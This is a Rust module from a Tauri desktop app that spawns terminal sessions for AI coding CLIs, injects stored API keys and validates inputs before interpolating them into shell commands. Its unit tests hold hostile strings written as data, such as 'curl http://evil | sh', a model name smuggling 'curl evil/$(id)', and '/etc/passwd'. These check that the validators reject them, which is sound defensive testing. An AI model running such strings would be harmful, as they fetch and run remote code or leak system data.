use portable_pty::{Child, CommandBuilder, NativePtySystem, PtyPair, PtySize, PtySystem};
use std::collections::HashMap;
use std::io::{Read, Write};
use std::sync::mpsc::{self, RecvTimeoutError};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};
use tauri::{AppHandle, Emitter, Manager, State};

// On Windows, killing a PTY's immediate child (powershell.exe) with TerminateProcess does NOT
// terminate the processes it spawned — the AI CLI (node/claude/python/…) and its own children
// are orphaned and keep holding RAM across open/close cycles. We fix this by placing each shell
// in a Job Object configured with KILL_ON_JOB_CLOSE: terminating the job (or just dropping its
// last handle) kills the entire process subtree. Descendants the shell spawns *after* assignment
// inherit job membership automatically (Win8+), and the shell needs hundreds of ms to start its
// CLI, so the assign-after-spawn race is not a problem in practice.
#[cfg(windows)]
mod proc_tree {
    use windows_sys::Win32::Foundation::CloseHandle;
    use windows_sys::Win32::System::JobObjects::{
        AssignProcessToJobObject, CreateJobObjectW, SetInformationJobObject, TerminateJobObject,
        JobObjectExtendedLimitInformation, JOBOBJECT_EXTENDED_LIMIT_INFORMATION,
        JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE,
    };
    use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_SET_QUOTA, PROCESS_TERMINATE};

    /// A Job Object owning a process subtree. `terminate()` kills the tree eagerly; dropping the
    /// handle kills it as a safety net (KILL_ON_JOB_CLOSE). Stored as `isize` so it's trivially
    /// `Send`/`Sync` (it's just an OS handle).
    pub struct JobObject(isize);

    unsafe impl Send for JobObject {}
    unsafe impl Sync for JobObject {}

    impl JobObject {
        /// Create a kill-on-close job and assign `pid` (and thus its future descendants) to it.
        /// Returns `None` if any step fails — callers then fall back to killing the child directly.
        pub fn attach(pid: u32) -> Option<JobObject> {
            unsafe {
                let job = CreateJobObjectW(std::ptr::null(), std::ptr::null());
                if job.is_null() {
                    return None;
                }
                let mut info: JOBOBJECT_EXTENDED_LIMIT_INFORMATION = std::mem::zeroed();
                info.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
                if SetInformationJobObject(
                    job,
                    JobObjectExtendedLimitInformation,
                    &info as *const _ as *const core::ffi::c_void,
                    std::mem::size_of::<JOBOBJECT_EXTENDED_LIMIT_INFORMATION>() as u32,
                ) == 0
                {
                    CloseHandle(job);
                    return None;
                }
                let process = OpenProcess(PROCESS_SET_QUOTA | PROCESS_TERMINATE, 0, pid);
                if process.is_null() {
                    CloseHandle(job);
                    return None;
                }
                let assigned = AssignProcessToJobObject(job, process);
                CloseHandle(process);
                if assigned == 0 {
                    CloseHandle(job);
                    return None;
                }
                Some(JobObject(job as isize))
            }
        }

        /// Kill every process in the job (shell + all descendants) immediately.
        pub fn terminate(&self) {
            unsafe {
                TerminateJobObject(self.0 as _, 1);
            }
        }
    }

    impl Drop for JobObject {
        fn drop(&mut self) {
            unsafe {
                CloseHandle(self.0 as _);
            }
        }
    }
}

/// Inert placeholder on non-Windows: Unix process cleanup goes through the existing
/// `child.kill()` path. `attach` never produces a job, so `terminate()` is unused.
#[cfg(not(windows))]
mod proc_tree {
    pub struct JobObject;

    impl JobObject {
        pub fn attach(_pid: u32) -> Option<JobObject> {
            None
        }

        pub fn terminate(&self) {}
    }
}

// How often the emitter thread coalesces PTY output before sending a `pty-output`
// event to the webview. Without this, a chatty process (AI CLIs streaming tokens,
// build logs, progress spinners) produces thousands of IPC events/second per pane,
// saturating the webview and freezing the UI. 16ms ≈ one frame.
const PTY_FLUSH_INTERVAL: Duration = Duration::from_millis(16);
// Flush early if the pending buffer grows past this, to bound event payload size
// and latency during sustained floods.
const PTY_FLUSH_THRESHOLD: usize = 64 * 1024;

// A transient PTY read error (ConPTY can briefly fail mid-resize or under heavy load) used to
// kill the reader thread permanently, leaving the shell alive but its output silenced forever —
// the pane looked frozen and the only recovery was to close it. Instead, retry a bounded number
// of times with a short backoff before giving up, so a momentary hiccup no longer freezes the
// session. A genuinely dead pipe still errors past the limit and ends the thread cleanly.
const MAX_CONSECUTIVE_READ_ERRORS: u32 = 20;
const READ_ERROR_BACKOFF: Duration = Duration::from_millis(25);

pub struct PtySession {
    // Input is NOT written to the PTY under this mutex. A dedicated writer thread owns the
    // `Box<dyn Write>` and drains this bounded channel; `write_pty` only clones the sender and
    // does a non-blocking `try_send`. `write_all` to a ConPTY blocks when the child stops draining
    // its stdin, and doing that under the session mutex (even on a blocking worker) would let a
    // stuck write hold the mutex `kill_pty` needs — so a wedged child could never be closed.
    // `Option` so `kill_pty` can drop the sender (ending the writer thread) before joining it.
    pub writer_tx: Option<mpsc::SyncSender<Vec<u8>>>,
    pub pair: PtyPair,
    pub child: Box<dyn Child + Send + Sync>,
    // Handles to the reader/emitter/writer threads so they can be joined on kill instead of
    // leaking across repeated open/close cycles.
    pub reader_handle: Option<thread::JoinHandle<()>>,
    pub emitter_handle: Option<thread::JoinHandle<()>>,
    pub writer_handle: Option<thread::JoinHandle<()>>,
    // Windows: Job Object owning the shell + its descendant process tree, so closing a pane
    // kills the AI CLI (and its children), not just powershell.exe. `None` on non-Windows or
    // if job assignment failed — in which case we fall back to `child.kill()` alone.
    pub job: Option<proc_tree::JobObject>,
}

pub struct PtyRegistry {
    pub sessions: Mutex<HashMap<String, Arc<Mutex<PtySession>>>>,
}

impl PtyRegistry {
    pub fn new() -> Self {
        Self {
            sessions: Mutex::new(HashMap::new()),
        }
    }

    /// Kill every live PTY child (and its descendant tree), draining the registry. Called only on
    /// window close and on Drop — both are process-exit paths — so agent CLIs don't survive as
    /// orphaned processes after the app exits. Safe to call more than once: the second drain finds
    /// nothing.
    ///
    /// This MUST stay non-blocking. It runs on the Tauri main/event-loop thread (the
    /// `CloseRequested` handler), so blocking it freezes the window message pump and Windows shows
    /// "Saple Bridge is not responding". We therefore only issue the fast, fire-and-forget kills
    /// here and deliberately do NOT `child.wait()` or join the reader/emitter threads the way
    /// `kill_pty` does: those exist to reclaim in-process resources across repeated open/close
    /// cycles, which is pointless when the whole process is about to exit — the OS reclaims the
    /// threads, handles and any zombies on exit, and `TerminateJobObject` + `KILL_ON_JOB_CLOSE`
    /// (re-armed when each dropped `PtySession` closes its job handle) guarantees the subtree dies
    /// even if we exit immediately afterward.
    pub fn shutdown(&self) {
        let drained: Vec<(String, Arc<Mutex<PtySession>>)> = {
            let mut map = self.sessions.lock().unwrap();
            map.drain().collect()
        };
        for (_id, session_arc) in drained {
            if let Ok(mut session) = session_arc.lock() {
                // Kill the whole subtree (shell + AI CLI + its children) via the Job Object;
                // fall back to killing the immediate child if no job was established. Both are
                // fast, non-blocking termination requests — no wait/join (see above).
                if let Some(job) = session.job.as_ref() {
                    job.terminate();
                }
                if let Ok(None) = session.child.try_wait() {
                    let _ = session.child.kill();
                }
            }
            // Dropping `session_arc` here drops the `PtySession`: closing the job handle re-fires
            // KILL_ON_JOB_CLOSE and closing the PTY pair lets the reader thread hit EOF and exit
            // on its own, without us blocking to join it.
        }
    }
}

impl Drop for PtyRegistry {
    fn drop(&mut self) {
        self.shutdown();
    }
}

#[derive(serde::Serialize, Clone)]
struct PtyOutputPayload {
    id: String,
    data: String,
}

// Emitted once when a session's reader thread ends (child exited, PTY closed, or the read pipe
// gave up). The frontend uses it to show a visible "process exited" notice, and — for
// swarm/task agent panes — as the completion fallback when no lifecycle marker was printed.
// `exit_code` is `None` when the child's status can no longer be determined (e.g. the session
// was already torn down by `kill_pty`).
#[derive(serde::Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct PtyExitPayload {
    id: String,
    exit_code: Option<u32>,
}

// Emit the valid UTF-8 prefix of `pending`, keeping any incomplete trailing
// multi-byte sequence buffered for the next flush.
fn emit_valid_utf8(pending: &mut Vec<u8>, app_handle: &AppHandle, id: &str) {
    if pending.is_empty() {
        return;
    }
    match std::str::from_utf8(pending) {
        Ok(s) => {
            if !s.is_empty() {
                let _ = app_handle.emit(
                    "pty-output",
                    PtyOutputPayload { id: id.to_string(), data: s.to_string() },
                );
            }
            pending.clear();
        }
        Err(e) => {
            let valid_end = e.valid_up_to();
            if valid_end > 0 {
                let s = unsafe { std::str::from_utf8_unchecked(&pending[..valid_end]) };
                let _ = app_handle.emit(
                    "pty-output",
                    PtyOutputPayload { id: id.to_string(), data: s.to_string() },
                );
                pending.drain(..valid_end);
            }
        }
    }
}

// Final flush at EOF: emit whatever is left, lossily decoding any trailing bytes.
fn emit_remaining_lossy(pending: &mut Vec<u8>, app_handle: &AppHandle, id: &str) {
    if pending.is_empty() {
        return;
    }
    let data = String::from_utf8_lossy(pending).to_string();
    let _ = app_handle.emit("pty-output", PtyOutputPayload { id: id.to_string(), data });
    pending.clear();
}

// Whether a provider's CLI accepts a prompt piped on stdin / via file redirect.
// GUI-oriented agents (cursor, copilot) are launched interactively instead of
// having the prompt file redirected into them.
fn provider_accepts_prompt_pipe(provider: &str) -> bool {
    !matches!(provider, "cursor" | "copilot")
}

// `spawn_pty`'s provider/model/prompt-file inputs cross the renderer→Rust trust boundary and are
// interpolated into a `powershell -Command` / `bash -lc` string, so everything that reaches that
// string must pass through the validators below. (`custom_command` is exempt by design: like the
// review verification command, it is operator-typed and shown verbatim in the UI before launch.)

/// Allowlist of launchable provider CLIs. Returns the executable invocation for a known
/// provider id, `None` otherwise — an unknown provider must never run verbatim as a command.
fn provider_command(provider: &str) -> Option<&'static str> {
    match provider {
        "codex" => Some("codex"),
        "claude" => Some("claude"),
        "gemini" => Some("gemini"),
        "openrouter" => Some("openrouter"),
        "opencode" => Some("opencode"),
        "cursor" => Some("cursor-agent"),
        "droid" => Some("droid"),
        "copilot" => Some("gh copilot"),
        "pi" => Some("pi"),
        _ => None,
    }
}

/// Model names are interpolated inside a double-quoted shell string; restrict them to
/// characters that are inert there (no `"`, backtick, `$`, backslash, whitespace, ...).
fn is_safe_model(model: &str) -> bool {
    !model.is_empty()
        && model
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | ':' | '/' | '@'))
}

/// A prompt file is interpolated into the shell command line as a redirect source. Require it
/// to be free of shell metacharacters, project-contained (relative, no `..` — enforced by
/// `get_project_file_path`), and already existing.
fn validate_prompt_file(cwd: &str, prompt_file: &str) -> Result<(), String> {
    const FORBIDDEN: &[char] = &['"', '\'', '`', '$', '<', '>', '|', ';', '&', '\n', '\r'];
    if prompt_file.contains(FORBIDDEN) {
        return Err("Prompt file path contains forbidden characters".to_string());
    }
    if cwd.is_empty() {
        return Err("Prompt file requires a project working directory".to_string());
    }
    let resolved = crate::project::get_project_file_path(cwd, prompt_file)?;
    if !resolved.is_file() {
        return Err(format!("Prompt file not found in project: {}", prompt_file));
    }
    Ok(())
}

#[tauri::command]
pub async fn spawn_pty(
    id: String,
    cwd: String,
    env: std::collections::HashMap<String, String>,
    ai_provider: Option<String>,
    model: Option<String>,
    prompt_file: Option<String>,
    custom_command: Option<String>,
    app_handle: AppHandle,
    registry: State<'_, PtyRegistry>,
) -> Result<(), String> {
    // A duplicate id would overwrite the existing registry entry, leaking its child process and
    // reader/emitter/writer threads (kill_pty would only ever reap the survivor). Check up front
    // (cheap, before spawning anything); the insert below re-checks to close the race window.
    if registry.sessions.lock().unwrap().contains_key(&id) {
        return Err(format!("PTY session {} already exists", id));
    }

    // Build the PTY, read keychain secrets and spawn the child process on a blocking
    // worker so this (synchronous, occasionally slow) work never blocks the Tauri main
    // thread / window message pump. The registry insert and the lightweight reader/emitter
    // thread spawns happen back on the async task afterwards.
    type PtyParts = (
        Box<dyn Write + Send>,
        PtyPair,
        Box<dyn Child + Send + Sync>,
        Box<dyn Read + Send>,
        Option<proc_tree::JobObject>,
    );
    let (writer, pair, child, mut reader, job) =
        tauri::async_runtime::spawn_blocking(move || -> Result<PtyParts, String> {
    // 1. Setup PTY system
    let pty_system = NativePtySystem::default();
    
    // 2. Define terminal size defaults
    let size = PtySize {
        rows: 24,
        cols: 80,
        pixel_width: 0,
        pixel_height: 0,
    };
    
    // 3. Open PTY pair
    let pair = pty_system.openpty(size).map_err(|e| e.to_string())?;
    
    // 4. Determine shell Command. On Unix, honor the user's login shell via
    // $SHELL (e.g. zsh on macOS) so terminals match their normal environment;
    // fall back to bash if it's unset.
    let shell = if cfg!(target_os = "windows") {
        "powershell.exe".to_string()
    } else {
        std::env::var("SHELL").unwrap_or_else(|_| "/bin/bash".to_string())
    };

    let mut cmd = CommandBuilder::new(shell.clone());

    // Tracks whether we launch the shell with a command (provider/custom). If
    // not, it's a plain terminal and we start a login shell below.
    let mut launched_command = false;

    if let Some(provider) = ai_provider.as_deref() {
        if provider != "custom" {
            let provider_cleaned = provider_command(provider)
                .ok_or_else(|| format!("Unknown AI provider: {}", provider))?;

            let model_str = model.as_deref().unwrap_or("default");
            let use_model_flag = model_str != "default" && !model_str.is_empty();
            if use_model_flag && !is_safe_model(model_str) {
                return Err(format!("Invalid model name: {}", model_str));
            }
            // Only redirect the prompt file into providers that accept a piped prompt.
            let pipe_file = prompt_file
                .as_ref()
                .filter(|_| provider_accepts_prompt_pipe(provider));
            if let Some(p_file) = pipe_file {
                validate_prompt_file(&cwd, p_file)?;
            }

            let run_cmd = if use_model_flag {
                if let Some(p_file) = pipe_file {
                    if cfg!(target_os = "windows") {
                        format!("Get-Content \"{}\" -Raw | {} --model \"{}\"", p_file, provider_cleaned, model_str)
                    } else {
                        format!("{} --model \"{}\" < \"{}\"", provider_cleaned, model_str, p_file)
                    }
                } else {
                    format!("{} --model \"{}\"", provider_cleaned, model_str)
                }
            } else {
                if let Some(p_file) = pipe_file {
                    if cfg!(target_os = "windows") {
                        format!("Get-Content \"{}\" -Raw | {}", p_file, provider_cleaned)
                    } else {
                        format!("{} < \"{}\"", provider_cleaned, p_file)
                    }
                } else {
                    provider_cleaned.to_string()
                }
            };

            // Headless agent panes (prompt piped in) must let the shell EXIT when the CLI
            // finishes, so `pty-exit` fires and the swarm scheduler gets a real completion
            // signal even when the agent never printed a lifecycle marker. Interactive
            // provider panes keep the shell alive after the CLI ends, as before.
            let headless = pipe_file.is_some();
            if cfg!(target_os = "windows") {
                if !headless {
                    cmd.arg("-NoExit");
                }
                cmd.arg("-Command");
                if headless {
                    // Propagate the CLI's exit code through powershell.exe. $LASTEXITCODE is
                    // null when no native command ran at all (e.g. CLI not found) — that's a
                    // failure, not a clean exit, so map it to 1.
                    cmd.arg(format!(
                        "{}; if ($null -eq $LASTEXITCODE) {{ exit 1 }} else {{ exit $LASTEXITCODE }}",
                        run_cmd
                    ));
                } else {
                    cmd.arg(run_cmd);
                }
            } else {
                cmd.arg("-lc");
                if headless {
                    cmd.arg(run_cmd);
                } else {
                    cmd.arg(format!("{}; exec {}", run_cmd, shell));
                }
            }
            launched_command = true;
        } else if let Some(ref custom_cmd) = custom_command {
            if !custom_cmd.is_empty() {
                if cfg!(target_os = "windows") {
                    cmd.arg("-NoExit");
                    cmd.arg("-Command");
                    cmd.arg(custom_cmd);
                } else {
                    cmd.arg("-lc");
                    cmd.arg(format!("{}; exec {}", custom_cmd, shell));
                }
                launched_command = true;
            }
        }
    }

    // No provider command -> plain interactive terminal. On Unix, start it as a
    // *login* shell so it sources ~/.zprofile and runs macOS path_helper, giving
    // the user's full PATH (Homebrew, ~/.local/bin, npm global). GUI apps launched
    // from Finder inherit only a minimal PATH, so without -l tools like `codex`
    // report "command not found" even though they work in Terminal.app and in
    // provider panes (which already use `-lc`).
    if !launched_command && !cfg!(target_os = "windows") {
        cmd.arg("-l");
    }

    if !cwd.is_empty() {
        cmd.cwd(cwd);
    }

    // GUI apps launched from Finder/Dock on macOS inherit no TERM, which breaks
    // curses programs (`clear` -> "TERM environment variable not set") and makes
    // the zsh line editor mis-redraw the prompt (garbled/doubled input). The
    // frontend is xterm.js, so advertise that. Any value supplied in `env` below
    // intentionally overrides these defaults.
    cmd.env("TERM", "xterm-256color");
    cmd.env("COLORTERM", "truecolor");

    for (k, v) in env {
        cmd.env(k, v);
    }
    
    // Auto-inject provider API key from OS Keychain if configured
    let key_service = match ai_provider.as_deref() {
        Some("codex") => Some(("saple_provider_codex_api_key", "OPENAI_API_KEY")),
        Some("claude") => Some(("saple_provider_claude_api_key", "ANTHROPIC_API_KEY")),
        Some("gemini") => Some(("saple_provider_gemini_api_key", "GEMINI_API_KEY")),
        Some("opencode") => Some(("saple_provider_opencode_api_key", "OPENCODE_API_KEY")),
        Some("openrouter") => Some(("saple_provider_openrouter_api_key", "OPENROUTER_API_KEY")),
        Some("cursor") => Some(("saple_provider_cursor_api_key", "CURSOR_API_KEY")),
        Some("droid") => Some(("saple_provider_droid_api_key", "FACTORY_API_KEY")),
        Some("copilot") => Some(("saple_provider_copilot_api_key", "GITHUB_TOKEN")),
        Some("pi") => Some(("saple_provider_pi_api_key", "PI_API_KEY")),
        Some("custom") => Some(("saple_provider_custom_api_key", "CUSTOM_API_KEY")),
        _ => None,
    };

    if let Some((service, env_var)) = key_service {
        if let Ok(entry) = keyring::Entry::new(service, "saple_bridge_user") {
            if let Ok(password) = entry.get_password() {
                cmd.env(env_var, &password);
                if env_var == "GEMINI_API_KEY" {
                    cmd.env("GOOGLE_API_KEY", &password);
                }
            }
        }
    }
    
    // Legacy fallback: the pre-`saple_provider_*` keychain entry. Only inject it for codex panes —
    // it sets OPENAI_API_KEY, which is meaningless (and a needless secret leak) in the env of a
    // claude/gemini/etc. CLI.
    if matches!(ai_provider.as_deref(), Some("codex")) {
        if let Ok(entry) = keyring::Entry::new("openai_api_key", "saple_bridge_user") {
            if let Ok(password) = entry.get_password() {
                cmd.env("OPENAI_API_KEY", password);
            }
        }
    }
    
    // 5. Start process inside PTY
    let child = pair.slave.spawn_command(cmd).map_err(|e| e.to_string())?;

    // Put the shell (and the descendants it will spawn) into a kill-on-close Job Object so
    // closing the pane tears down the whole process tree, not just powershell.exe. Done right
    // after spawn, before the shell has had time to launch the AI CLI. No-op on non-Windows.
    let job = child.process_id().and_then(proc_tree::JobObject::attach);

    // 6. Split reader & writer
    let reader = pair.master.try_clone_reader().map_err(|e| e.to_string())?;
    let writer = pair.master.take_writer().map_err(|e| e.to_string())?;

    Ok((writer, pair, child, reader, job))
        })
        .await
        .map_err(|e| e.to_string())??;

    // 7. Set up the input channel and store the session in the registry (cheap; kept on the async
    // task). A bounded channel gives backpressure instead of unbounded growth if a child stalls;
    // 256 queued input events is far more than interactive use ever needs.
    let (writer_tx, writer_rx) = mpsc::sync_channel::<Vec<u8>>(256);
    let session = Arc::new(Mutex::new(PtySession {
        writer_tx: Some(writer_tx),
        pair,
        child,
        reader_handle: None,
        emitter_handle: None,
        writer_handle: None,
        job,
    }));

    {
        let mut sessions = registry.sessions.lock().unwrap();
        if sessions.contains_key(&id) {
            // Lost the race to a concurrent spawn with the same id: kill the child we just
            // spawned instead of overwriting (and leaking) the established session.
            let mut new_session = session.lock().unwrap();
            if let Some(job) = new_session.job.as_ref() {
                job.terminate();
            }
            let _ = new_session.child.kill();
            return Err(format!("PTY session {} already exists", id));
        }
        sessions.insert(id.clone(), session.clone());
    }

    // Writer thread: owns the PTY writer and performs the (possibly blocking) write_all off any
    // command/main thread and WITHOUT holding the session mutex. If the child stops draining its
    // stdin this thread blocks here alone, while write_pty keeps returning instantly and kill_pty
    // can still take the mutex to terminate the pane. Exits when every sender drops (kill/shutdown).
    let writer_handle = thread::spawn(move || {
        let mut writer = writer;
        while let Ok(bytes) = writer_rx.recv() {
            if writer.write_all(&bytes).is_err() {
                break; // PTY closed
            }
            // No explicit flush: ConPTY/Unix PTYs write straight through and `take_writer` is not
            // buffered, so a per-write flush is just a wasted syscall.
        }
    });

    // 8. Spawn background threads for reading output.
    //
    // The reader thread does a blocking read from the PTY and forwards raw bytes over
    // a channel. A second emitter thread coalesces those bytes and sends at most one
    // `pty-output` event per PTY_FLUSH_INTERVAL (or sooner if the buffer is large).
    // This keeps interactive latency low (the recv_timeout flushes a partial line after
    // one frame) while collapsing output floods into a bounded number of IPC events.
    let id_for_emitter = id.clone();
    let (tx, rx) = mpsc::channel::<Vec<u8>>();

    // Reader thread: PTY -> channel. Exits on EOF/error (e.g. when the child is killed,
    // which closes the PTY). Dropping `tx` signals the emitter to do its final flush.
    let reader_handle = thread::spawn(move || {
        // 64 KiB, not 8: an AI CLI streaming tokens (or a build log) can flood the PTY, and a
        // larger buffer collapses that flood into ~8x fewer read syscalls + channel sends +
        // Vec allocations. The emitter's PTY_FLUSH_THRESHOLD still bounds the IPC event size
        // independently, so this only trims the reader-side overhead.
        let mut read_buf = [0u8; 64 * 1024];
        let mut consecutive_errors: u32 = 0;
        loop {
            match reader.read(&mut read_buf) {
                Ok(0) => break, // EOF — the child closed the PTY, a real end of session.
                Ok(n) => {
                    consecutive_errors = 0;
                    if tx.send(read_buf[..n].to_vec()).is_err() {
                        break; // emitter gone
                    }
                }
                // EINTR: an interrupted syscall, not a failure — just read again.
                Err(ref e) if e.kind() == std::io::ErrorKind::Interrupted => continue,
                Err(_) => {
                    // A transient read error must NOT permanently kill the pane (the old `break`
                    // here was the main cause of a session freezing mid-use: the shell stayed
                    // alive but its output stopped forever). Retry a bounded number of times with
                    // a short backoff; only give up once errors persist, which means the pipe is
                    // genuinely gone.
                    consecutive_errors += 1;
                    if consecutive_errors > MAX_CONSECUTIVE_READ_ERRORS {
                        break;
                    }
                    thread::sleep(READ_ERROR_BACKOFF);
                }
            }
        }
    });

    // Emitter thread: channel -> coalesced `pty-output` events. When idle it blocks on `recv`
    // (zero CPU, zero added latency), so the first byte of a burst — a keystroke echo, a fresh
    // prompt — is emitted immediately. It then coalesces further bytes for up to one frame before
    // returning to the idle block, which bounds the event rate during sustained output.
    let emitter_handle = thread::spawn(move || {
        let mut pending: Vec<u8> = Vec::new();
        // `Some(deadline)` = inside a coalescing window; `None` = idle.
        let mut window_end: Option<Instant> = None;
        // Emitted once when the reader ends (child gone / PTY closed / pipe dead) so the frontend
        // surfaces a "process exited" notice instead of a silent pane the user mistakes for a
        // freeze. The child's exit code is looked up from the registry when still possible: the
        // reader can hit EOF a beat before the OS marks the child reapable, so poll briefly
        // instead of reporting "unknown" for a perfectly normal exit. A session already removed
        // by kill_pty reports None — its exit code is irrelevant to the (gone) frontend pane.
        let emit_exit = |app_handle: &AppHandle, id: &str| {
            let exit_code = app_handle.try_state::<PtyRegistry>().and_then(|registry| {
                let session_arc = registry.sessions.lock().unwrap().get(id).cloned()?;
                for _ in 0..10 {
                    if let Ok(Some(status)) = session_arc.lock().ok()?.child.try_wait() {
                        return Some(status.exit_code());
                    }
                    thread::sleep(Duration::from_millis(20));
                }
                None
            });
            let _ = app_handle.emit(
                "pty-exit",
                PtyExitPayload { id: id.to_string(), exit_code },
            );
        };
        loop {
            if window_end.is_none() {
                // Idle: block until the next burst begins.
                match rx.recv() {
                    Ok(chunk) => {
                        pending.extend_from_slice(&chunk);
                        emit_valid_utf8(&mut pending, &app_handle, &id_for_emitter);
                        window_end = Some(Instant::now() + PTY_FLUSH_INTERVAL);
                    }
                    Err(_) => {
                        emit_remaining_lossy(&mut pending, &app_handle, &id_for_emitter);
                        emit_exit(&app_handle, &id_for_emitter);
                        break;
                    }
                }
            } else {
                let remaining = window_end
                    .unwrap()
                    .saturating_duration_since(Instant::now());
                match rx.recv_timeout(remaining) {
                    Ok(chunk) => {
                        pending.extend_from_slice(&chunk);
                        if pending.len() >= PTY_FLUSH_THRESHOLD {
                            emit_valid_utf8(&mut pending, &app_handle, &id_for_emitter);
                        }
                    }
                    Err(RecvTimeoutError::Timeout) => {
                        emit_valid_utf8(&mut pending, &app_handle, &id_for_emitter);
                        window_end = None; // back to idle
                    }
                    Err(RecvTimeoutError::Disconnected) => {
                        emit_remaining_lossy(&mut pending, &app_handle, &id_for_emitter);
                        emit_exit(&app_handle, &id_for_emitter);
                        break;
                    }
                }
            }
        }
    });

    // Record the thread handles so kill_pty can join them.
    {
        let mut session_guard = session.lock().unwrap();
        session_guard.reader_handle = Some(reader_handle);
        session_guard.emitter_handle = Some(emitter_handle);
        session_guard.writer_handle = Some(writer_handle);
    }

    Ok(())
}

#[tauri::command]
pub async fn write_pty(
    id: String,
    data: String,
    registry: State<'_, PtyRegistry>,
) -> Result<(), String> {
    // Clone the sender under the lock, then release it — we never block while holding the mutex,
    // and the actual write happens on the per-session writer thread. This is what lets a wedged
    // child (one that stopped reading its stdin) still be closed: a stuck write can no longer pin
    // the session mutex that kill_pty needs.
    let writer_tx = {
        let sessions = registry.sessions.lock().unwrap();
        let session_arc = sessions
            .get(&id)
            .ok_or_else(|| format!("PTY session {} not found", id))?;
        let session = session_arc.lock().unwrap();
        session
            .writer_tx
            .clone()
            .ok_or_else(|| format!("PTY session {} is closing", id))?
    };

    // `try_send`, never `send`: if the child has stalled and the 256-deep buffer is full, drop the
    // input rather than block. A wedged child wouldn't read it anyway, and never blocking here is
    // what keeps the UI responsive.
    match writer_tx.try_send(data.into_bytes()) {
        Ok(()) | Err(mpsc::TrySendError::Full(_)) => Ok(()),
        Err(mpsc::TrySendError::Disconnected(_)) => {
            Err(format!("PTY session {} writer closed", id))
        }
    }
}

#[tauri::command]
pub async fn resize_pty(
    id: String,
    cols: u16,
    rows: u16,
    registry: State<'_, PtyRegistry>,
) -> Result<(), String> {
    let session_arc = registry
        .sessions
        .lock()
        .unwrap()
        .get(&id)
        .cloned()
        .ok_or_else(|| format!("PTY session {} not found", id))?;

    // Off the main thread (see `write_pty`): `master.resize` can block, and a synchronous command
    // would stall the UI thread during the burst of resizes a window maximize/restore produces.
    tauri::async_runtime::spawn_blocking(move || -> Result<(), String> {
        let session = session_arc.lock().unwrap();
        let size = PtySize {
            cols,
            rows,
            pixel_width: 0,
            pixel_height: 0,
        };
        session.pair.master.resize(size).map_err(|e| e.to_string())
    })
    .await
    .map_err(|e| e.to_string())?
}

#[tauri::command]
pub fn kill_pty(
    id: String,
    registry: State<'_, PtyRegistry>,
) -> Result<(), String> {
    let session_arc = registry
        .sessions
        .lock()
        .unwrap()
        .remove(&id)
        .ok_or_else(|| format!("PTY session {} not found", id))?;

    thread::spawn(move || {
        // Kill the child and take the thread handles + the input sender while holding the lock,
        // then release it before joining so the I/O threads aren't blocked on the mutex.
        let (reader_handle, emitter_handle, writer_handle, writer_tx) = {
            let mut session = session_arc.lock().unwrap();
            // Kill the whole subtree (shell + AI CLI + its children) via the Job Object;
            // fall back to killing the immediate child if no job was established.
            if let Some(job) = session.job.as_ref() {
                job.terminate();
            }
            if let Ok(None) = session.child.try_wait() {
                let _ = session.child.kill();
            }
            let _ = session.child.wait();
            (
                session.reader_handle.take(),
                session.emitter_handle.take(),
                session.writer_handle.take(),
                session.writer_tx.take(),
            )
        };

        // Drop the input sender so the writer thread's `recv` returns and it exits; otherwise the
        // join below would hang on a thread blocked in `recv`.
        drop(writer_tx);

        // Killing the child closes the PTY, so the reader hits EOF and exits, which drops
        // the channel sender and lets the emitter finish its final flush. Join all three so
        // their resources are reclaimed instead of leaking across open/close cycles.
        if let Some(handle) = reader_handle {
            let _ = handle.join();
        }
        if let Some(handle) = emitter_handle {
            let _ = handle.join();
        }
        if let Some(handle) = writer_handle {
            let _ = handle.join();
        }
    });

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use std::path::PathBuf;

    #[test]
    fn provider_allowlist_rejects_unknown_commands() {
        assert_eq!(provider_command("codex"), Some("codex"));
        assert_eq!(provider_command("cursor"), Some("cursor-agent"));
        assert_eq!(provider_command("curl http://evil | sh"), None);
        assert_eq!(provider_command("custom"), None);
        assert_eq!(provider_command(""), None);
    }

    #[test]
    fn safe_model_accepts_real_model_ids() {
        for m in ["gpt-5.2", "claude-sonnet-5", "openrouter/auto", "o4:mini", "org@rev_1"] {
            assert!(is_safe_model(m), "{m} should be accepted");
        }
    }

    #[test]
    fn safe_model_rejects_shell_metacharacters() {
        for m in [
            "x\"; curl evil/$(id); echo \"",
            "a b",
            "a`b",
            "a$b",
            "a\\b",
            "",
        ] {
            assert!(!is_safe_model(m), "{m:?} should be rejected");
        }
    }

    fn temp_project() -> PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "saple-pty-test-{}-{}",
            std::process::id(),
            uuid::Uuid::new_v4()
        ));
        fs::create_dir_all(dir.join(".saple/agents/prompts")).unwrap();
        fs::write(dir.join(".saple/agents/prompts/p.md"), "prompt").unwrap();
        dir.canonicalize().unwrap()
    }

    #[test]
    fn prompt_file_accepts_contained_relative_path() {
        let dir = temp_project();
        assert!(validate_prompt_file(dir.to_str().unwrap(), ".saple/agents/prompts/p.md").is_ok());
        fs::remove_dir_all(dir).ok();
    }

    #[test]
    fn prompt_file_rejects_traversal_absolute_and_metachars() {
        let dir = temp_project();
        let cwd = dir.to_str().unwrap();
        assert!(validate_prompt_file(cwd, "../outside.md").is_err());
        assert!(validate_prompt_file(cwd, "/etc/passwd").is_err());
        assert!(validate_prompt_file(cwd, "C:\\Windows\\system.ini").is_err());
        assert!(validate_prompt_file(cwd, ".saple/a\" | curl evil; \".md").is_err());
        assert!(validate_prompt_file(cwd, ".saple/missing.md").is_err());
        assert!(validate_prompt_file("", ".saple/agents/prompts/p.md").is_err());
        fs::remove_dir_all(dir).ok();
    }
}
